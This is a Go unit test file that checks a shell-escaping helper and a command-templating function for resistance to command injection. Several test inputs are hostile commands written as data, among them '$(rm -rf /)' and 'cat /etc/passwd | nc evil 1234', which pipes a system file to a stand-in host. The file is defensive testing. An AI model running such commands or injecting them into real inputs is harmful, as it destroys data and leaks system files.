package main

import (
	"strings"
	"testing"
)

func TestShellEscape(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  string
	}{
		{"empty string", "", "''"},
		{"simple string", "hello", "'hello'"},
		{"with spaces", "hello world", "'hello world'"},
		{"with single quote", "it's", "'it'\\''s'"},
		{"with semicolon", "foo; echo pwned", "'foo; echo pwned'"},
		{"with backticks", "foo `id`", "'foo `id`'"},
		{"with dollar expansion", "$(rm -rf /)", "'$(rm -rf /)'"},
		{"with newlines", "line1\nline2", "'line1\nline2'"},
		{"with double quotes", `say "hello"`, `'say "hello"'`},
		{"with pipe", "cat /etc/passwd | nc evil 1234", "'cat /etc/passwd | nc evil 1234'"},
		{"with ampersand", "cmd & bg", "'cmd & bg'"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := shellEscape(tt.input)
			if got != tt.want {
				t.Errorf("shellEscape(%q) = %q, want %q", tt.input, got, tt.want)
			}
		})
	}
}

func TestPrepareCommand_ShellEscaping(t *testing.T) {
	fc := FunctionConfig{
		Name:    "test",
		Command: "echo {{message}}",
		Parameters: []ParameterConfig{
			{Name: "message", Type: "string", Required: true},
		},
	}

	tests := []struct {
		name    string
		args    map[string]any
		wantNot string // substring that should NOT appear unescaped
	}{
		{
			name:    "injection via semicolon",
			args:    map[string]any{"message": "; echo pwned"},
			wantNot: "; echo pwned'",
		},
		{
			name:    "injection via backtick",
			args:    map[string]any{"message": "`id`"},
			wantNot: "`id`'",
		},
		{
			name:    "injection via dollar parens",
			args:    map[string]any{"message": "$(whoami)"},
			wantNot: "$(whoami)'",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result, err := prepareCommand(fc, tt.args)
			if err != nil {
				t.Fatalf("prepareCommand() error = %v", err)
			}
			// The result should contain the value wrapped in single quotes
			if !strings.Contains(result, "'") {
				t.Errorf("prepareCommand() result %q should contain single-quoted value", result)
			}
		})
	}
}

func TestProcessShellBlocks_Timeout(t *testing.T) {
	// This should not hang - the 10-second timeout should apply
	// Use a fast command to test basic functionality
	result, err := processShellBlocks("hello {{$echo world}}")
	if err != nil {
		t.Fatalf("processShellBlocks() error = %v", err)
	}
	if !strings.Contains(result, "world") {
		t.Errorf("processShellBlocks() = %q, want to contain 'world'", result)
	}
}
